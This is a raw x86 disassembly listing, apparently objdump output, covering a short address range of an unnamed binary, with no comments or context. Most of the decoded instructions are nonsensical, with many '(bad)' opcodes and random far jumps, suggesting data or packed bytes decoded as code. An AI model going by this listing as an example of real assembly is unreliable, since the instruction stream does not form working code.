  4163d5:	xor    BYTE PTR [edi+eiz*8],bl
  4163d8:	xchg   edx,eax
  4163d9:	adc    al,0x6
  4163db:	sti    
  4163dc:	mov    eax,DWORD PTR [ebx]
  4163de:	or     eax,0xf1387e4
  4163e3:	cmc    
  4163e4:	jbe    0x4163e9
  4163e6:	add    ch,bh
  4163e8:	jp     0x416410
  4163ea:	out    0xf8,al
  4163ec:	adc    al,0x21
  4163ee:	stc    
  4163ef:	jecxz  0x4163d7
  4163f1:	push   ss
  4163f2:	push   cs
  4163f3:	cmc    
  4163f4:	dec    ebx
  4163f5:	pop    ss
  4163f6:	pop    ds
  4163f7:	in     eax,0x47
  4163f9:	adc    BYTE PTR [ecx],dh
  4163fb:	cli    
  4163fc:	dec    edi
  4163fd:	adc    dl,dl
  4163ff:	stc    
  416400:	or     al,0x1d
  416402:	(bad)  
  416403:	out    dx,eax
  416404:	(bad)  
  416405:	call   0x48a43120
  41640a:	sbb    eax,0x101b5ed4
  41640f:	fisttp QWORD PTR [ebx+0x4]
  416412:	or     al,0xf9
  416414:	inc    ebp
  416415:	cmp    eax,0x1e510965
  41641a:	jae    0x4163f1
  41641c:	push   esp
  41641d:	sub    BYTE PTR [edi-0x36],ah
  416420:	pop    ebx
  416421:	sub    eax,0x1e6fde50
  416426:	push   esp
  416427:	sti    
  416428:	(bad)  
  416429:	jmp    0xddb25373
  41642e:	add    BYTE PTR [ebp-0x13],dl
  416431:	imul   edi,DWORD PTR [ecx-0x16980ab3],0x2e
  416438:	fidiv  WORD PTR [ebx-0x38]
  41643b:	es out 0x71,al
  41643e:	jmp    0xbab24265
  416443:	inc    ebx
  416444:	in     al,dx
  416445:	jno    0x416414
  416447:	xor    dl,cl
  416449:	ins    BYTE PTR es:[edi],dx
  41644a:	mov    edx,0x945ecf36
  41644f:	adc    DWORD PTR [ecx],ecx
  416451:	push   ebx
  416452:	call   0xea49:0x884dfb11
  416459:	(bad)  
  41645a:	mov    edx,0x7d6cf251
  41645f:	push   ecx
  416460:	lds    esp,FWORD PTR [esi+0x7b]
  416463:	push   ecx
  416464:	call   0xf665eadc
  416469:	call   FWORD PTR [eax+0x3773fb2b]
  41646f:	and    dl,dh
  416471:	popa   
  416472:	inc    esp
  416473:	pop    ds
  416474:	or     DWORD PTR [esi+0x3a],eax
  416477:	and    eax,0x4a556cfb
  41647c:	call   0x54564ed
  416481:	dec    edi
  416482:	outs   dx,DWORD PTR ds:[esi]
  416483:	out    dx,al
  416484:	sbb    BYTE PTR [ebx+0x61],dh
  416487:	or     ch,BYTE PTR [eax]
  416489:	pop    esp
  41648a:	dec    ebp
  41648b:	stc    
  41648c:	push   ss
  41648d:	je     0x4164f8
  41648f:	es gs dec ebp
  416492:	jb     0x416494
  416494:	and    DWORD PTR [esi],ebx
  416496:	jb     0x416511
  416498:	xor    al,0x5
  41649a:	pop    esp
  41649b:	xor    ecx,DWORD PTR [edx]
  41649d:	(bad)  
  41649e:	fs je  0x4164ef
  4164a1:	sbb    DWORD PTR [eax+0x2e],esi
  4164a4:	inc    ecx
  4164a5:	pop    ds
  4164a6:	add    BYTE PTR gs:[esi-0x37],dl
  4164aa:	dec    esi
  4164ab:	imul   edi,esp,0xe12e6f29
  4164b1:	and    ah,BYTE PTR [ebp+0x0]
  4164b4:	mov    ah,0x42
  4164b6:	popa   
  4164b7:	je     0x416455
  4164b9:	push   ss
  4164ba:	gs jbe 0x4164aa
  4164bd:	or     BYTE PTR [eax+0x61],dl
  4164c0:	fwait
  4164c1:	adc    edx,DWORD PTR [ebx+0x6f]
  4164c4:	call   0x14:0x8a55001c
  4164cb:	push   ebp
  4164cc:	mov    ebp,DWORD PTR [ecx]
  4164ce:	jb     0x41651e
  4164d0:	test   eax,0x7a006121
  4164d5:	pop    ds
  4164d6:	imul   esi,DWORD PTR [esp+ebx*8+0x1d],0x72
  4164db:	gs mov ebx,0xb1726b0c
  4164e1:	or     BYTE PTR [eax+0x6f],dl
  4164e4:	sbb    cl,BYTE PTR [eax+eax*1]
  4164e7:	push   ebx
  4164e8:	mov    bh,0x2a
  4164ea:	je     0x416563
  4164ec:	mov    ecx,0x3b5c6116
  4164f1:	and    dh,BYTE PTR [ecx+0x74]
  4164f4:	loopne 0x41655a
  4164f6:	dec    edi
  4164f7:	imul   eax,DWORD PTR [eax],0x721cdc31
  4164fd:	adc    DWORD PTR [esi],esi
  4164ff:	sbb    eax,0x16d3c961
  416504:	ins    BYTE PTR es:[edi],dx
  416505:	mov    dl,0x18
  416508:	arpl   dx,ax
  41650a:	adc    eax,0x25d3632f
  41650f:	push   ss
  416510:	addr16 (bad) 
  416512:	or     al,0x28
  416514:	inc    ecx
  416515:	(bad)  
  416516:	or     ebx,DWORD PTR [edx]
  416518:	arpl   WORD PTR [edx-0x6892e6e2],dx
  41651e:	pop    ds
  41651f:	add    al,0x51
  416521:	xchg   esp,eax
  416522:	or     BYTE PTR [edi],0x63
  416525:	mov    ds:0x94700916,eax
  41652a:	jb     0x41656b
  41652c:	push   esp
  41652d:	popa   
  41652e:	push   edx
  41652f:	inc    esp
  416530:	dec    ebp
  416531:	outs   dx,DWORD PTR ds:[esi]
  416532:	mov    esi,0x72654d33
  416537:	aas    
  416538:	push   esp
  416539:	sub    DWORD PTR [edi+0x7c314e38],0x72577211
  416543:	and    eax,0x1f4b6350
  416548:	addr16 pop ebp
  41654a:	dec    ebp
  41654b:	adc    al,0x0
  41654d:	mov    dl,0xac
  41654f:	test   DWORD PTR ds:0x679bdeaf,ecx
  416555:	inc    edx
  416556:	retf   
  416557:	xchg   BYTE PTR [eax+0x25],ch
  41655a:	sahf   
  41655b:	adc    DWORD PTR [edx],edi
  41655d:	add    BYTE PTR [esi-0x45],dl
  416560:	add    DWORD PTR [eax+0x25],ebp
  416563:	(bad)  
  416564:	adc    BYTE PTR [ecx+0x5b],dh
  416567:	dec    ebx
  416568:	fdivr  st,st(7)
  41656a:	adc    al,0xfe
  41656c:	adc    BYTE PTR [edx],bh
  41656e:	push   esi
  41656f:	mov    ebx,0x9016d01
  416574:	dec    esp
  416575:	push   ss
  416576:	(bad)  
  416577:	or     BYTE PTR [esi+0x23],dl
  41657a:	(bad)  
  41657c:	add    al,0x20
  41657e:	push   es
  41657f:	cmc    
  416580:	out    0x28,al
  416582:	add    ah,ch
  416584:	dec    esp
  416585:	adc    ah,bl
  416587:	jmp    0xcc2e84c4
  41658c:	ss pop ds
  41658e:	ret    
  41658f:	jmp    0xe30d9a9a
  416594:	sbb    dl,BYTE PTR [ecx]
  416596:	(bad)  
  416597:	test   BYTE PTR [ebx],0x4
  41659a:	jge    0x416584
  41659c:	sbb    DWORD PTR [eax],edx
  41659e:	push   ecx
  41659f:	vunpckhps ymm2,ymm0,YMMWORD PTR [edx-0x5ce7051a]
  4165a7:	add    BYTE PTR [edx-0x61782fd],bh
  4165ad:	sqrtps xmm2,xmm0
  4165b0:	cld    
  4165b1:	adc    al,0x85
  4165b3:	call   0xd9927d8a
  4165b8:	(bad)  
  4165b9:	mulps  xmm1,XMMWORD PTR [ecx]
  4165bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165bd:	adc    edx,DWORD PTR [edx-0x9]
  4165c0:	(bad)  
  4165c1:	fld    DWORD PTR [eax]
  4165c3:	jbe    0x41659a
  4165c5:	mov    bl,0x37
  4165c7:	jne    0x4165bf
  4165c9:	into   
  4165ca:	push   ds
  4165cb:	pop    ebp
  4165cc:	in     eax,dx
  4165cd:	xchg   edx,eax
  4165ce:	sbb    BYTE PTR [ecx-0x1c],al
  4165d1:	mov    esp,0x93ea5027
  4165d6:	push   ss
  4165d7:	push   esi
  4165d8:	jmp    0x41655c
  4165da:	add    esp,DWORD PTR [eax+esi*8]
  4165dd:	cdq    
  4165de:	push   ds
  4165df:	pmaddwd mm2,QWORD PTR [esi+0x79f32314]
  4165e6:	fst    DWORD PTR [eax]
  4165e8:	lock mov WORD PTR [ebx],es
  4165eb:	in     eax,dx
  4165ec:	(bad)  
  4165ed:	dec    DWORD PTR [ecx-0x6ab938d9]
  4165f3:	xor    bl,al
  4165f5:	ins    BYTE PTR es:[edi],dx
  4165f6:	dec    edi
  4165f7:	and    esp,esi
  4165f9:	pop    esi
  4165fa:	pop    ebx
  4165fb:	adc    ch,bl
  4165fd:	ds dec edx
  4165ff:	adc    bh,al
  416601:	inc    esi
  416602:	xor    eax,0x1c51ce35
  416607:	sub    eax,0x1274cd8
  41660c:	aam    0x3e
  41660e:	sbb    esi,eax
  416610:	fadd   QWORD PTR [eax+0x3d]
  416613:	adc    al,0xf8
  416615:	jo     0x416623
  416617:	and    bl,ch
  416619:	push   ebx
  41661a:	and    BYTE PTR [ebp-0x1a],al
  41661d:	dec    ebx
  41661e:	add    BYTE PTR [ebx-0x23],dl
  416621:	js     0x41664d
  416623:	jae    0x41664f
  416625:	inc    esi
  416626:	mov    ebx,0x46397300
  41662b:	int3   
  41662c:	cli    
  41662d:	sub    DWORD PTR [edi],esi
  41662f:	mov    ebp,0x283f35e9
  416634:	jb     0x416664
  416636:	inc    edx
  416637:	stos   BYTE PTR es:[edi],al
  416638:	xor    al,0x36
  41663a:	sub    edx,DWORD PTR ds:0x1d363b04
  416640:	jo     0x416679
  416642:	xor    eax,0x3534efa7
  416647:	les    esi,FWORD PTR [edx]
  416649:	fmul   DWORD PTR [edi+eiz*4+0x1e]
  41664d:	aam    0x3e
  41664f:	fwait
  416650:	jno    0x41662f
  416652:	inc    eax
  416653:	mov    ebp,0x8c70f815
  416658:	and    ebx,ebp
  41665a:	push   ebx
  41665b:	mov    al,ds:0x804be642
  416660:	push   eax
  416661:	fnstsw WORD PTR [eax-0x30]
  416664:	icebp  
  416665:	cmp    DWORD PTR [ebx],esi
  416667:	add    ch,dl
  416669:	pop    eax
  41666a:	das    
  41666b:	cmp    DWORD PTR [ebp-0x38],edi
  41666e:	sub    al,0x32
  416670:	retf   0x3160
  416673:	aaa    
  416674:	lds    ecx,FWORD PTR [edx+0x2a]
  416677:	inc    edx
  416678:	dec    ebx
  416679:	dec    edx
  41667a:	ss sub eax,0x32355915
  416680:	inc    ebp
  416681:	cmp    edi,DWORD PTR [eax]
  416683:	xor    BYTE PTR [edi+0x56],al
  416686:	das    
  416687:	inc    ebx
  416688:	in     eax,dx
  416689:	add    al,0x73
  41668b:	imul   eax,DWORD PTR [eax],0x7466280b
  416691:	or     BYTE PTR [esi],dl
  416693:	jb     0x41670b
  416695:	sti    
  416696:	push   edx
  416697:	data16 outs dx,BYTE PTR ds:[esi]
  416699:	and    DWORD PTR ds:0x2a4b6973,eax
  41669f:	data16 je 0x4166ea
  4166a2:	pop    edi
  4166a3:	data16 outs dx,BYTE PTR ds:[esi]
  4166a5:	xor    DWORD PTR ds:0x27385446,ecx
  4166ab:	imul   edi,DWORD PTR [ecx+0x39],0x18
  4166af:	popa   
  4166b0:	jb     0x4166a0
  4166b2:	push   ss
  4166b3:	je     0x416725
  4166b5:	or     BYTE PTR [edi],dh
  4166b7:	push   esp
  4166b8:	push   eax
  4166b9:	mov    dh,0x1f
  4166bb:	jne    0x41671e
  4166bd:	imul   DWORD PTR [ecx]
  4166bf:	jb     0x4166ef
  4166c1:	or     DWORD PTR [eax+eax*1],ebp
  4166c4:	pop    esp
  4166c5:	call   0x6b3b:0xff6e6514
  4166cc:	data16 test BYTE PTR [esi+0x60],bl
  4166d0:	outs   dx,DWORD PTR ds:[esi]
  4166d1:	in     eax,dx
  4166d2:	or     al,0x6e
  4166d4:	jae    0x416751
  4166d6:	pop    ebx
  4166d7:	sub    esp,DWORD PTR [esp+ebx*4+0x20]
  4166db:	add    BYTE PTR [esi-0x15],cl
  4166de:	cmp    ebx,DWORD PTR [ebx+0x49]
  4166e1:	xor    DWORD PTR [eax-0x67ce8be4],edx
  4166e7:	xor    dl,BYTE PTR [ecx-0xa]
  4166ea:	xchg   edx,eax
  4166eb:	sbb    DWORD PTR [ebx+0x5],esi
  4166ee:	mov    ss,WORD PTR [esi]
  4166f0:	jne    0x4166f2
  4166f2:	pop    ss
  4166f3:	bound  esi,QWORD PTR [ebx]
  4166f5:	push   ecx
  4166f6:	loop   0x41669b
  4166f8:	and    al,0x71
  4166fa:	or     al,0x18
  4166fc:	rcr    BYTE PTR [ebp+esi*8-0x34],1
  416700:	push   ds
  416701:	ins    DWORD PTR es:[edi],dx
  416702:	int    0xc4
  416704:	inc    ecx
  416705:	jae    0x4166de
  416707:	iret   
  416708:	sbb    al,0x72
  41670a:	xor    DWORD PTR [ebx],edx
  41670c:	cmp    eax,0x3d1df841
  416711:	dec    ebx
  416712:	out    0x27,al
  416714:	adc    ah,BYTE PTR [ebx-0x2c]
  416717:	sub    BYTE PTR [eax],dl
  416719:	arpl   sp,ax
  41671b:	popa   
  41671c:	xor    DWORD PTR [ecx+0x60],ecx
  41671f:	push   ecx
  416720:	and    al,0x45
  416722:	mov    WORD PTR [esi],ss
  416724:	cmp    DWORD PTR [esi-0x5b],ebp
  416727:	or     eax,0x1e906e12
  41672c:	aaa    
  41672d:	arpl   WORD PTR [eax+0x7d6d1813],cx
  416733:	bound  esi,QWORD PTR [ecx]
  416735:	dec    ecx
  416736:	inc    eax
  416737:	mov    cl,0x24
  416739:	aas    
  41673a:	jl     0x416792
  41673c:	sbb    DWORD PTR [ebx+0x5f],esp
  41673f:	pop    esi
  416740:	sbb    ah,BYTE PTR [ecx+0x50]
  416743:	push   esi
  416744:	push   ds
  416745:	add    BYTE PTR [ecx-0x7dd12d55],al
  41674b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41674c:	das    
  41674d:	pop    ebp
  41674e:	jne    0x41679d
  416750:	and    BYTE PTR [edx+0x48],dh
  416753:	mov    dl,0xd
  416755:	add    BYTE PTR [eax],al
  416757:	popa   
  416758:	stos   DWORD PTR es:[edi],eax
  416759:	shr    BYTE PTR [esi],cl
  41675b:	push   esi
  41675c:	or     DWORD PTR [ebp-0x4611edef],ebp
  416762:	pop    ss
  416763:	adc    al,0xfd
  416765:	out    0x3,al
  416767:	xor    DWORD PTR [ecx],ecx
  416769:	out    0x3,eax
  41676b:	xor    DWORD PTR [ecx],ecx
  41676d:	out    0x3,eax
  41676f:	xor    DWORD PTR [ecx],ecx
  416771:	out    0x3,eax
  416773:	xor    DWORD PTR [ecx],ecx
  416775:	out    0x3,eax
  416777:	xor    DWORD PTR [ecx],ecx
  416779:	out    0x3,eax
  41677b:	xor    DWORD PTR [ecx],ecx
  41677d:	out    0x3,eax
  41677f:	xor    DWORD PTR [ecx],ecx
  416781:	out    0x3,eax
  416783:	xor    DWORD PTR [ecx],ecx
  416785:	out    0x3,eax
  416787:	loopne 0x416782
  416789:	cmp    bl,BYTE PTR [ebx]
  41678b:	fucomp st(5)
  41678d:	stc    
  41678e:	aad    0xd2
  416790:	in     al,0x4a
  416792:	add    al,0xc0
  416794:	stc    
  416795:	inc    edx
  416796:	sbb    eax,ebp
  416798:	in     eax,dx
  416799:	stc    
  41679a:	and    al,0xc4
  41679c:	clc    
  41679d:	or     edx,DWORD PTR [esi]
  41679f:	xor    edx,edi
  4167a1:	pop    ss
  4167a2:	sbb    BYTE PTR [esi+0x7dd10bfd],cl
  4167a8:	jmp    0x10e6:0xeca014fa
  4167af:	sahf   
  4167b0:	in     eax,0xf
  4167b2:	adc    BYTE PTR [edx-0x7cebe9c6],dl
  4167b8:	in     al,dx
  4167b9:	mul    BYTE PTR [edx]
  4167bb:	add    BYTE PTR [ebx+0x5e10e6ec],al
  4167c1:	in     eax,0xcf
  4167c3:	rsqrtps xmm7,XMMWORD PTR [edx]
  4167c6:	mov    dh,0x10
  4167c8:	gs in  al,dx
  4167ca:	(bad)  
  4167cb:	add    esp,DWORD PTR [eax-0x8]
  4167ce:	rcr    BYTE PTR [edx],cl
  4167d0:	inc    ebp
  4167d1:	in     al,dx
  4167d2:	stc    
  4167d3:	and    al,0x50
  4167d5:	out    0xff,al
  4167d7:	les    ebp,FWORD PTR [edi]
  4167d9:	loop   0x416848
  4167db:	mov    ss,WORD PTR [eax]
  4167dd:	(bad)  
  4167de:	jae    0x41676c
  4167e0:	inc    ecx
  4167e1:	or     DWORD PTR [ecx-0x68],esi
  4167e4:	ds out dx,al
  4167e6:	jae    0x416774
  4167e8:	adc    ebp,0xfa3e7e60
  4167ee:	push   0xffffff97
  4167f0:	push   ebp
  4167f1:	jmp    0x41685e
  4167f3:	mov    ss,WORD PTR [eax+0x9]
  4167f6:	add    BYTE PTR [ebp+eiz*1+0x1e7870f3],al
  4167fd:	out    dx,al
  4167fe:	jae    0x41684c
  416800:	es daa 
  416802:	fs dec ebp
  416804:	popa   
  416805:	jbe    0x416879
  416807:	pop    eax
  416808:	popa   
  416809:	out    dx,eax
  41680a:	jae    0x416850
  41680c:	push   ds
  41680d:	aam    0x6c
  41680f:	cmp    DWORD PTR [eax-0x1c],ebx
  416812:	(bad)  
  416813:	cmp    DWORD PTR [edx+eiz*8],edi
  416816:	cmp    ax,0x3948
  41681a:	pop    ebp
  41681b:	dec    edx
  41681c:	inc    ecx
  41681d:	in     eax,0x70
  41681f:	or     al,0x0
  416821:	xor    eax,0x140d6ef8
  416826:	cli    
  416827:	(bad)  
  416828:	ficom  DWORD PTR [ebx]
  41682a:	out    0x71,al
  41682c:	add    al,0x1d
  41682e:	xlat   BYTE PTR ds:[ebx]
  41682f:	jno    0x41683d
  416831:	xor    eax,0x140d6ef8
  416836:	cli    
  416837:	bound  edi,QWORD PTR [edx+0x473f913]
  41683d:	std    
  41683e:	jne    0x4168b2
  416840:	fcomp  st(6)
  416842:	out    dx,al
  416843:	jae    0x416809
  416845:	pop    ds
  416846:	aam    0x60
  416848:	(bad)  
  416849:	into   
  41684a:	cli    
  41684b:	push   0xffffffbf
  41684d:	shl    edi,cl
  41684f:	jbe    0x416851
  416851:	mov    WORD PTR [eax+0x70],fs
  416854:	add    BYTE PTR [ebx+0x7c69697c],cl
  41685a:	pusha  
  41685b:	xor    BYTE PTR [edi-0x15],bl
  41685e:	jp     0x4168c9
  416860:	jne    0x416827
  416862:	ja     0x4168c0
  416864:	bound  esi,QWORD PTR [edx+edi*2+0x988005f]
  41686b:	add    BYTE PTR [eax],al
  41686d:	mov    BYTE PTR [ecx],cl
  41686f:	add    BYTE PTR [eax],al
  416871:	cwde   
  416872:	or     DWORD PTR [eax],eax
  416874:	add    BYTE PTR [eax-0x77fffff7],bl
  41687a:	or     DWORD PTR [eax],eax
  41687c:	add    BYTE PTR [eax+0x58000009],cl
  416882:	or     DWORD PTR [eax],eax
  416884:	add    BYTE PTR [eax],al
  416886:	pop    eax
  416887:	or     DWORD PTR [eax],eax
  416889:	add    BYTE PTR [eax+0x79],cl
  41688c:	outs   dx,DWORD PTR ds:[esi]
  41688d:	outs   dx,DWORD PTR ds:[esi]
  41688e:	out    dx,al
  41688f:	arpl   WORD PTR [ecx+0x65],bp
  416892:	or     edi,DWORD PTR [ebx]
  416894:	outs   dx,BYTE PTR gs:[esi]
  416896:	loope  0x4168a4
  416898:	push   eax
  416899:	jb     0x416892
  41689b:	bound  esp,QWORD PTR [esi+0x6c]
  41689e:	in     eax,dx
  41689f:	or     al,0x45
  4168a1:	jae    0x41690d
  4168a3:	bound  ebp,QWORD PTR [ecx+0x61]
  4168a6:	cmp    al,0x66
  4168a8:	jae    0x41690f
  4168aa:	or     BYTE PTR [ecx+0x5e],bl
  4168ad:	je     0x4168df
  4168af:	or     eax,0x610c6150
  4168b4:	push   ecx
  4168b5:	outs   dx,DWORD PTR ds:[esi]
  4168b6:	dec    ebp
  4168b7:	jne    0x41691b
  4168b9:	add    al,bh
  4168bb:	jle    0x41691f
  4168bd:	data16 sti 
  4168bf:	cmp    ch,BYTE PTR [edx+0x73]
  4168c2:	fdivr  DWORD PTR [ebx+0x66]
  4168c5:	div    BYTE PTR [bx+0x6b]
  4168c9:	jae    0x4168fc
  4168cb:	or     al,0xf5
  4168cd:	outs   dx,BYTE PTR ds:[esi]
  4168ce:	inc    ebp
  4168cf:	dec    ecx
  4168d0:	cmc    
  4168d1:	bound  esi,QWORD PTR [ecx]
  4168d3:	scas   eax,DWORD PTR es:[edi]
  4168d4:	in     al,dx
  4168d5:	fs push edi
  4168d7:	inc    ebx
  4168d8:	out    dx,eax
  4168d9:	jo     0x4168ea
  4168db:	mov    dh,0xf9
  4168dd:	jae    0x416910
  4168df:	scas   eax,DWORD PTR es:[edi]
  4168e0:	in     al,dx
  4168e1:	fs pop ds
  4168e3:	fwait
  4168e4:	out    dx,eax
  4168e5:	jo     0x41694a
  4168e7:	inc    esp
  4168e8:	cmc    
  4168e9:	ja     0x4168eb
  4168eb:	and    eax,0xe66f662
  4168f0:	hlt    
  4168f1:	icebp  
  4168f2:	ins    DWORD PTR es:[edi],dx
  4168f3:	add    ch,BYTE PTR [edi-0x1f68bd1]
  4168f9:	add    BYTE PTR [ecx],ah
  4168fb:	inc    ebx
  4168fc:	jg     0x4168ff
  4168fe:	and    DWORD PTR [ebx-0x72],eax
  416901:	add    DWORD PTR [ecx],esp
  416903:	and    eax,ebp
  416905:	add    edx,DWORD PTR [ecx-0x14]
  416908:	and    eax,0x20540c5
  41690d:	in     al,dx
  41690e:	ins    BYTE PTR es:[edi],dx
  41690f:	loop   0x4168ee
  416911:	icebp  
  416912:	pop    esi
  416913:	fadd   st(4),st
  416915:	das    
  416916:	and    ah,cl
  416918:	ret    
  416919:	loop   0x41698c
  41691b:	mov    eax,0xcd62f831
  416920:	sbb    al,0xf3
  416922:	bound  esp,QWORD PTR [ebx-0x73951ee4]
  416928:	inc    esi
  416929:	and    DWORD PTR [ebx-0x71],esp
  41692c:	push   ebp
  41692e:	jbe    0x4168d1
  416930:	push   ds
  416931:	in     eax,0x63
  416933:	popa   
  416934:	add    ebx,esi
  416936:	jo     0x4169b6
  416938:	add    esi,esi
  41693a:	arpl   WORD PTR [ecx+0x24],dx
  41693d:	(bad)  
  41693e:	dec    esp
  41693f:	fs inc edx
  416941:	out    dx,al
  416942:	ins    BYTE PTR es:[edi],dx
  416943:	imul   ecx,DWORD PTR [ecx],0xffffffc6
  416946:	out    dx,eax
  416947:	push   ebp
  416948:	in     al,dx
  416949:	iret   
  41694a:	icebp  
  41694b:	popa   
  41694c:	or     DWORD PTR [ebp-0x119fff16],ebp
  416952:	(bad)  
  416953:	lock inc esi
  416955:	or     DWORD PTR [ebx-0x3010aa32],esp
  41695b:	out    dx,eax
  41695c:	dec    edx
  41695d:	jmp    0xe9c3:0xf74fc992
  416964:	sbb    eax,0x3c2f1
  416969:	in     al,0x84
  41696b:	mul    DWORD PTR ds:0xfae698ea
  416971:	lds    edi,FWORD PTR [ebp-0x3]
  416974:	pop    ss
  416975:	in     eax,0x92
  416977:	loop   0x4168ff
  416979:	and    al,0xcc
  41697b:	cs xor ebx,ebp
  41697e:	jp     0x416973
  416980:	cmp    BYTE PTR [esi+edi*4],ah
  416983:	add    ebx,ecx
  416985:	cld    
  416986:	pop    edx
  416987:	hlt    
  416988:	sub    BYTE PTR [esi+ecx*1],ah
  41698b:	add    al,0xc9
  41698d:	cld    
  41698e:	pop    edx
  41698f:	hlt    
  416990:	loope  0x4169c0
  416992:	(bad)  
  416993:	xor    BYTE PTR [ecx],dh
  416995:	jmp    0x4169d1
  416997:	hlt    
  416998:	adc    al,0x9
  41699a:	inc    ebp
  41699b:	jmp    0x41695d
  41699d:	in     eax,dx
  41699e:	sub    al,0xd8
  4169a0:	out    0xf7,al
  4169a2:	aas    
  4169a3:	clc    
  4169a4:	xchg   ebx,eax
  4169a5:	not    ah
  4169a7:	out    0x87,eax
  4169a9:	std    
  4169aa:	out    0xd4,al
  4169ac:	xchg   ebx,eax
  4169ad:	call   0xdec65ad5
  4169b2:	add    edi,ebx
  4169b4:	add    BYTE PTR [esi],cl
  4169b6:	iret   
  4169b7:	xor    esi,ecx
  4169b9:	mov    al,ah
  4169bb:	or     dh,al
  4169bd:	pop    edi
  4169be:	aad    0xff
  4169c0:	sbb    DWORD PTR [esi],ecx
  4169c2:	aam    0x4a
  4169c4:	(bad)  
  4169c5:	loopne 0x4169a8
  4169c7:	(bad)  
  4169c8:	loopne 0x4169d0
  4169ca:	jae    0x416a0f
  4169cc:	int    0xe1
  4169ce:	jmp    0xcd38533b
  4169d3:	imul   edi,DWORD PTR [esi-0x54a41e2b],0xffffffbc
  4169da:	in     eax,0x74
  4169dc:	mov    edx,0xe95bf8d7
  4169e1:	out    0xe5,eax
  4169e3:	jns    0x4169a5
  4169e5:	sahf   
  4169e6:	ficomp WORD PTR [esi-0x17]
  4169e9:	xchg   BYTE PTR [edi-0x21745c94],bh
  4169ef:	imul   ecx,DWORD PTR [eax+0x7e71c276],0xffffff98
  4169f6:	jmp    0x416a63
  4169f8:	mov    WORD PTR [ebp-0x32],?
  4169fb:	call   FWORD PTR [ecx+0x7e73ec81]
  416a01:	xchg   ebx,eax
  416a02:	clc    
  416a03:	bound  ecx,QWORD PTR [ebp+0x4a62e77e]
  416a09:	push   ebp
  416a0a:	int3   
  416a0b:	push   ebx
  416a0c:	cmp    DWORD PTR ds:0x69597032,esi
  416a12:	jmp    0x416a85
  416a14:	jmp    0x48a24f97
  416a19:	add    BYTE PTR [ecx-0x3a],al
  416a1c:	cmp    si,WORD PTR ds:0x4a466ce7
  416a23:	fistp  WORD PTR [esi+0x3b]
  416a26:	sbb    ah,BYTE PTR [esp+eiz*2]
  416a29:	or     BYTE PTR [ecx],ch
  416a2b:	jb     0x416a7f
  416a2d:	adc    BYTE PTR [ecx],bl
  416a2f:	out    0x46,eax
  416a31:	pop    es
  416a32:	pmulhw mm5,QWORD PTR ds:0xffc1f738
  416a39:	(bad)  
  416a3a:	aas    
  416a3b:	popa   
  416a3c:	data16 outs dx,BYTE PTR ds:[esi]
  416a3e:	or     BYTE PTR [esi+ebx*2+0x76],cl
  416a42:	das    
  416a43:	ja     0x416aab
  416a45:	je     0x416a7c
  416a47:	jbe    0x416a74
  416a49:	fs stc 
  416a4b:	jns    0x416a4a
  416a4d:	push   esi
  416a4e:	add    DWORD PTR [ebx+eax*2+0x54],esp
  416a52:	cwde   
  416a53:	add    eax,0x60e4696f
  416a58:	jo     0x416a88
  416a5a:	hlt    
  416a5b:	addr16 std 
  416a5d:	inc    edx
  416a5e:	mov    WORD PTR [esi+0x46],ss
  416a61:	inc    esp
  416a62:	pushf  
  416a63:	outs   dx,BYTE PTR ds:[esi]
  416a64:	cs xor ebx,ebx
  416a67:	cmp    al,0x44
  416a69:	aaa    
  416a6a:	test   BYTE PTR [ecx+ebp*1],bh
  416a6d:	inc    ecx
  416a6e:	xchg   ecx,eax
  416a6f:	xor    BYTE PTR [edx+0x2d],al
  416a72:	jns    0x416ab0
  416a74:	fs xor cl,ch
  416a77:	sub    eax,0x38c8383d
  416a7c:	xor    BYTE PTR [eax],dh
  416a7e:	add    BYTE PTR [eax+0x35],dh
  416a81:	cmp    eax,0x3236ca44
  416a86:	inc    esi
  416a87:	xchg   esi,eax
  416a88:	cmp    DWORD PTR [ecx+0x5c],edi
  416a8b:	and    DWORD PTR [ebx+0x4d],esp
  416a8e:	jb     0x416a7f
  416a90:	gs push eax
  416a92:	gs cli 
  416a94:	jp     0x416af8
  416a96:	jb     0x416ac3
  416a98:	aaa    
  416a99:	add    BYTE PTR [ebx-0xb],dh
  416a9c:	jbe    0x416b11
  416a9e:	gs cli 
  416aa0:	jne    0x416acd
  416aa2:	js     0x416a91
  416aa4:	js     0x416aa3
  416aa6:	pop    ebx
  416aa7:	push   esi
  416aa8:	push   ecx
  416aa9:	dec    ebp
  416aaa:	inc    edi
  416aab:	xor    eax,0x3a657171
  416ab0:	add    eax,0x2e315341
  416ab5:	call   0xe5f1ae1b
  416aba:	pop    esi
  416abb:	jge    0x416b1f
  416abd:	aam    0x43
  416abf:	nop
  416ac0:	jbe    0x416aa6
  416ac2:	sub    eax,0xfff8018d
  416ac7:	mov    ah,BYTE PTR ds:0x576273f1
  416acd:	jecxz  0x416b42
  416acf:	jge    0x416a72
  416ad1:	int    0x45
  416ad3:	jge    0x416a87
  416ad5:	add    DWORD PTR [edi+0x5f],eax
  416ad8:	push   esi
  416ad9:	call   0xf57ec24f
  416ade:	pop    ds
  416adf:	je     0x416b2b
  416ae1:	icebp  
  416ae2:	imul   eax,DWORD PTR [eax],0x46
  416ae5:	mov    ah,0xe8
  416ae7:	jno    0x416b1a
  416ae9:	xchg   edi,eax
  416aea:	in     al,dx
  416aeb:	ins    DWORD PTR es:[edi],dx
  416aec:	sbb    BYTE PTR [eax-0x7f0d8c18],bl
  416af2:	loop   0x416b5b
  416af4:	or     al,0xa3
  416af6:	out    dx,eax
  416af7:	bound  edx,QWORD PTR ds:0x1873eb85
  416afd:	sub    ebp,0xd29d3170
  416b03:	pop    ds
  416b04:	call   0x5878ca5
  416b09:	xchg   edx,eax
  416b0a:	and    DWORD PTR [eax-0x30],edx
  416b0d:	shr    dh,cl
  416b0f:	je     0x416adf
  416b11:	shl    edi,cl
  416b13:	jo     0x416b46
  416b15:	push   ds
  416b16:	aam    0x3e
  416b18:	loope  0x416b42
  416b1a:	cmp    ah,BYTE PTR [eax]
  416b1c:	xor    DWORD PTR [edx],esp
  416b1e:	retf   0xfd34
  416b21:	inc    ebp
  416b22:	mov    edx,0xfcf720cd
  416b27:	(bad)  
  416b28:	fsub   DWORD PTR [ecx-0x16]
  416b2b:	inc    ebp
  416b2c:	pop    ss
  416b2d:	or     DWORD PTR [eax],ebp
  416b2f:	retf   0x2d65
  416b32:	cmp    DWORD PTR [edx-0xa9e61c],0xe
  416b39:	mov    ds:0x5f6ceae7,al
  416b3e:	sub    edx,ecx
  416b40:	inc    ebp
